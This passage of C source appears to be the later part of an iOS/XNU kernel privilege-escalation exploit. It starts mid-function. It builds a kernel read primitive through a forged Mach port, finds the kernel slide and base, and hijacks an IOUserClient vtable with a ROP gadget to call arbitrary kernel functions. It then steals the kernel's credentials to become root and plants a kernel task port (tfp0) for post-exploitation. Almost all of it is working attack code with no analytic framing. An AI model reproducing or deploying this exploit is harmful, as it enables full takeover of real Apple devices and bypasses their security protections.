    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
    LOG("reallocate_buf: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
#define KREAD(addr, buf, len) \
do \
{ \
for(size_t i = 0; i < ((len) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i) \
{ \
ret = my_mach_port_set_context(self, fakeport, (addr) + i * sizeof(uint32_t)); \
if(ret != KERN_SUCCESS) \
{ \
LOG("mach_port_set_context: %s", mach_error_string(ret)); \
goto out; \
} \
mach_msg_type_number_t outsz = 1; \
ret = mach_port_get_attributes(self, fakeport, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)((uint32_t*)(buf) + i), &outsz); \
if(ret != KERN_SUCCESS) \
{ \
LOG("mach_port_get_attributes: %s", mach_error_string(ret)); \
goto out; \
} \
} \
} while(0)
    
    kptr_t itk_space = 0;
    KREAD(realport_addr + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &itk_space, sizeof(itk_space));
    LOG("itk_space: " ADDR, itk_space);
    if(!itk_space)
    {
        goto out;
    }
    
    kptr_t self_task = 0;
    KREAD(itk_space + OFFSET_ipc_space_is_task, &self_task, sizeof(self_task));
    LOG("self_task: " ADDR, self_task);
    if(!self_task)
    {
        goto out;
    }
    
    kptr_t IOSurfaceRootUserClient_port = 0;
    KREAD(self_task + OFFSET_task_itk_registered, &IOSurfaceRootUserClient_port, sizeof(IOSurfaceRootUserClient_port));
    LOG("IOSurfaceRootUserClient port: " ADDR, IOSurfaceRootUserClient_port);
    if(!IOSurfaceRootUserClient_port)
    {
        goto out;
    }
    
    kptr_t IOSurfaceRootUserClient_addr = 0;
    KREAD(IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_kobject - (uintptr_t)&kport), &IOSurfaceRootUserClient_addr, sizeof(IOSurfaceRootUserClient_addr));
    LOG("IOSurfaceRootUserClient addr: " ADDR, IOSurfaceRootUserClient_addr);
    if(!IOSurfaceRootUserClient_addr)
    {
        goto out;
    }
    
    kptr_t IOSurfaceRootUserClient_vtab = 0;
    KREAD(IOSurfaceRootUserClient_addr, &IOSurfaceRootUserClient_vtab, sizeof(IOSurfaceRootUserClient_vtab));
    LOG("IOSurfaceRootUserClient vtab: " ADDR, IOSurfaceRootUserClient_vtab);
    if(!IOSurfaceRootUserClient_vtab)
    {
        goto out;
    }
    
    kptr_t slide = IOSurfaceRootUserClient_vtab - OFFSET_IOSURFACEROOTUSERCLIENT_VTAB;
    LOG("slide: " ADDR, slide);
    if((slide % 0x100000) != 0)
    {
        goto out;
    }
    
    
    // Unregister IOSurfaceRootUserClient port
    ret = mach_ports_register(self, NULL, 0);
    LOG("mach_ports_register: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    kptr_t vtab[VTAB_SIZE] = { 0 };
    KREAD(IOSurfaceRootUserClient_vtab, vtab, sizeof(vtab));
    
    kptr_t kbase = (vtab[OFFSET_vtab_get_retain_count] & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
    for(uint32_t magic = 0; 1; kbase -= KERNEL_SLIDE_STEP)
    {
        KREAD(kbase, &magic, sizeof(magic));
        if(magic == KERNEL_MAGIC)
        {
            break;
        }
    }
    LOG("Kernel base: " ADDR, kbase);
    
#define OFF(name) (OFFSET_##name + (kbase - OFFSET_BASE))
    
    kptr_t zone_map_addr = 0;
    KREAD(OFF(ZONE_MAP), &zone_map_addr, sizeof(zone_map_addr));
    LOG("zone_map: " ADDR, zone_map_addr);
    if(!zone_map_addr)
    {
        goto out;
    }
    
    vtab[OFFSET_vtab_get_external_trap_for_index] = OFF(ROP_LDR_X0_X0_0x10);
    
    uint32_t faketask_off = fakeport_off < sizeof(ktask_t) ? fakeport_off + sizeof(kport_t) : 0;
    faketask_off = UINT64_ALIGN(faketask_off);
    uintptr_t faketask_buf = (uintptr_t)&dict[5] + faketask_off;
    
    ktask_t ktask;
    memset(&ktask, 0, sizeof(ktask));
    ktask.a.lock.data = 0x0;
    ktask.a.lock.type = 0x22;
    ktask.a.ref_count = 100;
    ktask.a.active = 1;
    ktask.a.map = zone_map_addr;
    ktask.b.itk_self = 1;
    UNALIGNED_COPY(&ktask, faketask_buf, sizeof(ktask));
    
    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
    kport.ip_kobject = fake_addr + faketask_off;
    kport.ip_requests = 0;
    kport.ip_context = 0;
    UNALIGNED_COPY(&kport, fakeport_dictbuf, sizeof(kport));
    
#undef KREAD
    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
    LOG("reallocate_buf: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    vm_prot_t cur = 0,
    max = 0;
    sched_yield();
    ret = mach_vm_remap(self, &shmem_addr, DATA_SIZE, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, fakeport, fake_addr, false, &cur, &max, VM_INHERIT_NONE);
    if(ret != KERN_SUCCESS)
    {
        LOG("mach_vm_remap: %s", mach_error_string(ret));
        goto out;
    }
    *(uint32_t*)shmem_addr = 123; // fault page
    LOG("shmem_addr: 0x%016llx", shmem_addr);
    volatile kport_t *fakeport_buf = (volatile kport_t*)(shmem_addr + fakeport_off);
    
    uint32_t vtab_off = fakeport_off < sizeof(vtab) ? fakeport_off + sizeof(kport_t) : 0;
    vtab_off = UINT64_ALIGN(vtab_off);
    kptr_t vtab_addr = fake_addr + vtab_off;
    LOG("vtab addr: " ADDR, vtab_addr);
    volatile kptr_t *vtab_buf = (volatile kptr_t*)(shmem_addr + vtab_off);
    for(volatile kptr_t *src = vtab, *dst = vtab_buf, *end = src + VTAB_SIZE; src < end; *(dst++) = *(src++));
    
#define MAXRANGES 5
    struct
    {
        uint32_t start;
        uint32_t end;
    } ranges[MAXRANGES] =
    {
        { fakeport_off, (uint32_t)(fakeport_off + sizeof(kport_t)) },
        { vtab_off, (uint32_t)(vtab_off + sizeof(vtab)) },
    };
    size_t numranges = 2;
#define FIND_RANGE(var, size) \
do \
{ \
if(numranges >= MAXRANGES) \
{ \
LOG("FIND_RANGE(" #var "): ranges array too small"); \
goto out; \
} \
for(int32_t i = 0; i < numranges; ++i) \
{ \
uint32_t end = var + (uint32_t)(size); \
if( \
(var >= ranges[i].start && var < ranges[i].end) || \
(end >= ranges[i].start && var < ranges[i].end) \
) \
{ \
var = UINT64_ALIGN(ranges[i].end); \
i = -1; \
} \
} \
if(var + (uint32_t)(size) > DATA_SIZE) \
{ \
LOG("FIND_RANGE(" #var ") out of range: 0x%x-0x%x", var, var + (uint32_t)(size)); \
goto out; \
} \
ranges[numranges].start = var; \
ranges[numranges].end = var + (uint32_t)(size); \
++numranges; \
} while(0)
    
    typedef union
    {
        struct {
            // IOUserClient fields
            kptr_t vtab;
            uint32_t refs;
            uint32_t pad;
            // Gadget stuff
            kptr_t trap_ptr;
            // IOExternalTrap fields
            kptr_t obj;
            kptr_t func;
            uint32_t break_stuff; // idk wtf this field does, but it has to be zero or iokit_user_client_trap does some weird pointer mashing
            // OSSerializer::serialize
            kptr_t indirect[3];
        } a;
        struct {
            char pad[OFFSET_IOUSERCLIENT_IPC];
            int32_t __ipc;
        } b;
    } kobj_t;
    
    uint32_t fakeobj_off = 0;
    FIND_RANGE(fakeobj_off, sizeof(kobj_t));
    kptr_t fakeobj_addr = fake_addr + fakeobj_off;
    LOG("fakeobj addr: " ADDR, fakeobj_addr);
    volatile kobj_t *fakeobj_buf = (volatile kobj_t*)(shmem_addr + fakeobj_off);
    VOLATILE_ZERO(fakeobj_buf, sizeof(kobj_t));
    
    fakeobj_buf->a.vtab = vtab_addr;
    fakeobj_buf->a.refs = 100;
    fakeobj_buf->a.trap_ptr = fakeobj_addr + ((uintptr_t)&fakeobj_buf->a.obj - (uintptr_t)fakeobj_buf);
    fakeobj_buf->a.break_stuff = 0;
    fakeobj_buf->b.__ipc = 100;
    
    fakeport_buf->ip_bits = 0x8000001d; // IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT
    fakeport_buf->ip_kobject = fakeobj_addr;
    
    // First arg to KCALL can't be == 0, so we need KCALL_ZERO which indirects through OSSerializer::serialize.
    // That way it can take way less arguments, but well, it can pass zero as first arg.
#define KCALL(addr, x0, x1, x2, x3, x4, x5, x6) \
( \
fakeobj_buf->a.obj = (kptr_t)(x0), \
fakeobj_buf->a.func = (kptr_t)(addr), \
(kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x1), (kptr_t)(x2), (kptr_t)(x3), (kptr_t)(x4), (kptr_t)(x5), (kptr_t)(x6)) \
)
#define KCALL_ZERO(addr, x0, x1, x2) \
( \
fakeobj_buf->a.obj = fakeobj_addr + ((uintptr_t)&fakeobj_buf->a.indirect - (uintptr_t)fakeobj_buf) - 2 * sizeof(kptr_t), \
fakeobj_buf->a.func = OFF(OSSERIALIZER_SERIALIZE), \
fakeobj_buf->a.indirect[0] = (x0), \
fakeobj_buf->a.indirect[1] = (x1), \
fakeobj_buf->a.indirect[2] = (addr), \
(kptr_t)IOConnectTrap6(fakeport, 0, (kptr_t)(x2), 0, 0, 0, 0, 0) \
)
    kptr_t kernel_task_addr = 0;
    int r = KCALL(OFF(COPYOUT), OFF(KERNEL_TASK), &kernel_task_addr, sizeof(kernel_task_addr), 0, 0, 0, 0);
    LOG("kernel_task addr: " ADDR ", %s, %s", kernel_task_addr, errstr(r), mach_error_string(r));
    if(r != 0 || !kernel_task_addr)
    {
        goto out;
    }
    
    kptr_t kernproc_addr = 0;
    r = KCALL(OFF(COPYOUT), kernel_task_addr + OFFSET_task_bsd_info, &kernproc_addr, sizeof(kernproc_addr), 0, 0, 0, 0);
    LOG("kernproc addr: " ADDR ", %s, %s", kernproc_addr, errstr(r), mach_error_string(r));
    if(r != 0 || !kernproc_addr)
    {
        goto out;
    }
    
    
#pragma mark - steal kernel creds
    
    kptr_t kern_ucred = 0;
    r = KCALL(OFF(COPYOUT), kernproc_addr + OFFSET_proc_ucred, &kern_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    LOG("kern_ucred: " ADDR ", %s, %s", kern_ucred, errstr(r), mach_error_string(r));
    if(r != 0 || !kern_ucred)
    {
        goto out;
    }
    *kerncred = kern_ucred;
    
    
    kptr_t self_proc = 0;
    r = KCALL(OFF(COPYOUT), self_task + OFFSET_task_bsd_info, &self_proc, sizeof(self_proc), 0, 0, 0, 0);
    LOG("self_proc: " ADDR ", %s, %s", self_proc, errstr(r), mach_error_string(r));
    if(r != 0 || !self_proc)
    {
        goto out;
    }
    *selfproc = self_proc;
    
    
    kptr_t self_ucred = 0;
    r = KCALL(OFF(COPYOUT), self_proc + OFFSET_proc_ucred, &self_ucred, sizeof(self_ucred), 0, 0, 0, 0);
    LOG("self_ucred: " ADDR ", %s, %s", self_ucred, errstr(r), mach_error_string(r));
    if(r != 0 || !self_ucred)
    {
        goto out;
    }
    *selfcred = self_ucred;
    
    
    int olduid = getuid();
    LOG("uid: %u", olduid);
    
    KCALL(OFF(KAUTH_CRED_REF), kern_ucred, 0, 0, 0, 0, 0, 0);
    r = KCALL(OFF(COPYIN), &kern_ucred, self_proc + OFFSET_proc_ucred, sizeof(kern_ucred), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0 || !self_ucred)
    {
        goto out;
    }
    // Note: decreasing the refcount on the old cred causes a panic with "cred reference underflow", so... don't do that.
    LOG("stole the kernel's credentials");
    kern_return_t err = setuid(0); // update host port
    LOG("setuid(0) %s", mach_error_string(err));
    
    int newuid = getuid();
    LOG("uid: %u", newuid);
    
    if(newuid != olduid)
    {
        KCALL_ZERO(OFF(CHGPROCCNT), newuid, 1, 0);
        KCALL_ZERO(OFF(CHGPROCCNT), olduid, -1, 0);
    }
    
    
#pragma mark -
    
    
    host_t realhost = mach_host_self();
    LOG("realhost: %x (host: %x)", realhost, host);
    
    uint32_t zm_task_off = 0;
    FIND_RANGE(zm_task_off, sizeof(ktask_t));
    kptr_t zm_task_addr = fake_addr + zm_task_off;
    LOG("zm_task addr: " ADDR, zm_task_addr);
    volatile ktask_t *zm_task_buf = (volatile ktask_t*)(shmem_addr + zm_task_off);
    VOLATILE_ZERO(zm_task_buf, sizeof(ktask_t));
    
    zm_task_buf->a.lock.data = 0x0;
    zm_task_buf->a.lock.type = 0x22;
    zm_task_buf->a.ref_count = 100;
    zm_task_buf->a.active = 1;
    zm_task_buf->b.itk_self = 1;
    zm_task_buf->a.map = zone_map_addr;
    
    uint32_t km_task_off = 0;
    FIND_RANGE(km_task_off, sizeof(ktask_t));
    kptr_t km_task_addr = fake_addr + km_task_off;
    LOG("km_task addr: " ADDR, km_task_addr);
    volatile ktask_t *km_task_buf = (volatile ktask_t*)(shmem_addr + km_task_off);
    VOLATILE_ZERO(km_task_buf, sizeof(ktask_t));
    
    km_task_buf->a.lock.data = 0x0;
    km_task_buf->a.lock.type = 0x22;
    km_task_buf->a.ref_count = 100;
    km_task_buf->a.active = 1;
    km_task_buf->b.itk_self = 1;
    r = KCALL(OFF(COPYOUT), OFF(KERNEL_MAP), &km_task_buf->a.map, sizeof(km_task_buf->a.map), 0, 0, 0, 0);
    LOG("kernel_map: " ADDR ", %s", km_task_buf->a.map, errstr(r));
    if(r != 0 || !km_task_buf->a.map)
    {
        goto out;
    }
    
    kptr_t ipc_space_kernel = 0;
    r = KCALL(OFF(COPYOUT), IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &ipc_space_kernel, sizeof(ipc_space_kernel), 0, 0, 0, 0);
    LOG("ipc_space_kernel: " ADDR ", %s", ipc_space_kernel, errstr(r));
    if(r != 0 || !ipc_space_kernel)
    {
        goto out;
    }
    
    kmap_hdr_t zm_hdr = { 0 };
    r = KCALL(OFF(COPYOUT), zm_task_buf->a.map + OFFSET_vm_map_hdr, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
    LOG("zm_range: " ADDR "-" ADDR ", %s", zm_hdr.start, zm_hdr.end, errstr(r));
    if(r != 0 || !zm_hdr.start || !zm_hdr.end)
    {
        goto out;
    }
    if(zm_hdr.end - zm_hdr.start > 0x100000000)
    {
        LOG("zone_map is too big, sorry.");
        goto out;
    }
    kptr_t zm_tmp = 0; // macro scratch space
    
#define ZM_FIX_ADDR(addr) \
( \
zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
)
    
    kptr_t ptrs[2] = { 0 };
    ptrs[0] = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    ptrs[1] = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("zm_port addr: " ADDR, ptrs[0]);
    LOG("km_port addr: " ADDR, ptrs[1]);
    
    KCALL(OFF(IPC_KOBJECT_SET), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFF(IPC_KOBJECT_SET), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);
    
    r = KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_task_itk_registered, sizeof(ptrs), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0)
    {
        goto out;
    }
    mach_msg_type_number_t mapsNum = 0;
    ret = mach_ports_lookup(self, &maps, &mapsNum);
    LOG("mach_ports_lookup: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    LOG("zone_map port: %x", maps[0]);
    LOG("kernel_map port: %x", maps[1]);
    if(!MACH_PORT_VALID(maps[0]) || !MACH_PORT_VALID(maps[1]))
    {
        goto out;
    }
    // Clean out the pointers without dropping refs
    ptrs[0] = ptrs[1] = 0;
    r = KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_task_itk_registered, sizeof(ptrs), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0)
    {
        goto out;
    }
    
    mach_vm_address_t remap_addr = 0;
    ret = mach_vm_remap(maps[1], &remap_addr, OFFSET_sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kernel_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    LOG("mach_vm_remap: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    LOG("remap_addr: 0x%016llx", remap_addr);
    
    ret = mach_vm_wire(realhost, maps[1], remap_addr, OFFSET_sizeof_task, VM_PROT_READ | VM_PROT_WRITE);
    LOG("mach_vm_wire: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS)
    {
        goto out;
    }
    
    kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
    LOG("newport: " ADDR, newport);
    KCALL(OFF(IPC_KOBJECT_SET), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
    KCALL(OFF(IPC_PORT_MAKE_SEND), newport, 0, 0, 0, 0, 0, 0);
    r = KCALL(OFF(COPYIN), &newport, OFF(REALHOST) + OFFSET_realhost_special + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
    LOG("copyin: %s", errstr(r));
    if(r != 0)
    {
        goto out;
    }
    
    task_t kernel_task = MACH_PORT_NULL;
    ret = host_get_special_port(realhost, HOST_LOCAL_NODE, 4, &kernel_task);
    LOG("kernel_task: %x, %s", kernel_task, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(kernel_task))
    {
        goto out;
    }
    
#pragma mark - post-exploit
    
    // Stuff needed for post-exploitation duties...
    *tfp0 = kernel_task;
    *kslide = slide;
    *kerncred = kern_ucred;
    *selfcred = self_ucred;
    *selfproc = self_proc;
    
    retval = KERN_SUCCESS;
    
    
#pragma mark - cleanup

    out:;
    LOG("Cleaning up...");
    usleep(100000); // Allow logs to propagate
    if(maps)
    {
        RELEASE_PORT(maps[0]);
        RELEASE_PORT(maps[1]);
    }
    RELEASE_PORT(fakeport);
    for(size_t i = 0; i < NUM_AFTER; ++i)
    {
        RELEASE_PORT(after[i]);
    }
    RELEASE_PORT(port);
    for(size_t i = 0; i < NUM_BEFORE; ++i)
    {
        RELEASE_PORT(before[i]);
    }
    RELEASE_PORT(realport);
    RELEASE_PORT(stuffport);
    RELEASE_PORT(client);
    my_mach_zone_force_gc(host);
    if(shmem_addr != 0)
    {
        _kernelrpc_mach_vm_deallocate_trap(self, shmem_addr, DATA_SIZE);
        shmem_addr = 0;
    }
    
    // Pass through error code, if existent
    if(retval != KERN_SUCCESS && ret != KERN_SUCCESS)
    {
        retval = ret;
    }
        
    return retval;
}

